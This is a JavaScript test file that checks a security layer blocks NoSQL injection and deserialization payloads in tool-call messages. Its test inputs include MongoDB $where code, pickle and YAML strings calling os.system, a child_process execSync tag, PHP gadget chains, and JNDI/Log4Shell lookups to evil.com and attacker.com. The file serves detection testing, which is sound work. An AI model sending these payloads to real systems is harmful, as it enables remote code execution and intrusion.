import { describe, it, expect, beforeEach } from 'vitest';
import ContentValidationLayer from '@/security/layers/layer2-content.js';

/**
 * NoSQL Injection and Deserialization Attack Detection Tests
 * Tests for MongoDB operators and serialization gadget detection
 * Coverage: injection.js patterns (nosql, deserialization)
 */

describe('NoSQL Injection Detection', () => {
  let layer;

  beforeEach(() => {
    layer = new ContentValidationLayer({ debugMode: false });
  });

  describe('MongoDB Operator Injection', () => {
    // NOTE: The content validator checks multiple patterns
    // NoSQL patterns may or may not fire first depending on what else is in the payload
    // These tests verify that malicious MongoDB payloads are BLOCKED (passed=false)
    // regardless of which specific pattern catches them

    it('should detect $where with inline JavaScript execution', async () => {
      // $where with function is a critical NoSQL attack vector
      const message = createToolCallMessage({
        query: '{"$where": "function() { return db.admin.find(); }"}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect $where with JavaScript code', async () => {
      // $where with code execution attempt
      const message = createToolCallMessage({
        mongoQuery: '{"$where": "sleep(5000)"}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect ObjectId in query context', async () => {
      const message = createToolCallMessage({
        id: 'ObjectId("507f1f77bcf86cd799439011")'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Safe MongoDB-like Content', () => {
    it('should allow normal JSON without operators', async () => {
      const message = createToolCallMessage({
        data: '{"username": "john", "email": "john@example.com"}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(true);
    });

    it('should allow text mentioning MongoDB concepts', async () => {
      const message = createToolCallMessage({
        description: 'Use MongoDB with proper query validation'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(true);
    });
  });
});

describe('Deserialization Attack Detection', () => {
  let layer;

  beforeEach(() => {
    layer = new ContentValidationLayer({ debugMode: false });
  });

  describe('Java Serialization Detection', () => {
    it('should detect Java serialized object (Base64)', async () => {
      // rO0AB is the base64-encoded Java serialization magic bytes
      const message = createToolCallMessage({
        data: 'rO0ABXNyABdqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
      expect(result.reason).toMatch(/deserialization|serial|java/i);
    });

    it('should detect Java object stream header', async () => {
      const message = createToolCallMessage({
        payload: 'rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('PHP Serialization Detection', () => {
    it('should detect PHP object serialization', async () => {
      const message = createToolCallMessage({
        data: 'O:8:"stdClass":1:{s:4:"test";s:5:"value";}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect PHP gadget chain attempt', async () => {
      const message = createToolCallMessage({
        payload: 'O:21:"JDatabaseDriverMysql":3:{s:4:"conn";N;s:2:"fc";O:17:"SimplePie_Cache":0:{};}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Python Pickle Detection', () => {
    it('should detect pickle primitives (cos/system)', async () => {
      // This pattern matches the Python pickle exploit using os.system
      const message = createToolCallMessage({
        data: 'cos\nsystem\n(S\'id\'\ntR.'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect pickle REDUCE opcode', async () => {
      const message = createToolCallMessage({
        payload: 'cposix\nsystem\nREDUCE\n'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect pickle GLOBAL opcode', async () => {
      const message = createToolCallMessage({
        data: 'GLOBAL\nos\nsystem\n'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('YAML Deserialization Detection', () => {
    it('should detect Python YAML object tag', async () => {
      const message = createToolCallMessage({
        config: '!!python/object/apply:os.system ["id"]'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect JavaScript function tag', async () => {
      const message = createToolCallMessage({
        data: '!!js/function "function() { return process.mainModule.require(\'child_process\').execSync(\'id\'); }"'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('JNDI/Log4Shell Detection', () => {
    it('should detect JNDI LDAP injection', async () => {
      const message = createToolCallMessage({
        input: '${jndi:ldap://evil.com/exploit}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect JNDI RMI injection', async () => {
      const message = createToolCallMessage({
        data: '${jndi:rmi://attacker.com:1099/Object}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect JNDI DNS injection', async () => {
      const message = createToolCallMessage({
        payload: '${jndi:dns://evil.com/a}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('.NET BinaryFormatter Detection', () => {
    it('should detect .NET serialized object', async () => {
      // AAEAAAD is the base64 marker for .NET BinaryFormatter
      const message = createToolCallMessage({
        data: 'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0='
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Ruby Marshal Detection', () => {
    it('should detect Ruby Marshal.load pattern', async () => {
      const message = createToolCallMessage({
        code: 'Marshal.load(user_input)'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });

    it('should detect Base64-encoded Ruby marshal', async () => {
      // BAh prefix for Ruby marshal data - needs to be 10+ chars after BAh
      const message = createToolCallMessage({
        data: 'BAh0123456789abcdefghij'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(false);
    });
  });

  describe('Safe Serialization Content', () => {
    it('should allow normal Base64 data', async () => {
      const message = createToolCallMessage({
        image: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(true);
    });

    it('should allow normal JSON strings', async () => {
      const message = createToolCallMessage({
        data: '{"type": "object", "properties": {"name": "string"}}'
      });
      const result = await layer.validate(message, {});

      expect(result.passed).toBe(true);
    });
  });
});

function createToolCallMessage(params = {}) {
  return {
    jsonrpc: '2.0',
    method: 'tools/call',
    id: 1,
    params: {
      name: 'data-processor',
      arguments: params
    }
  };
}
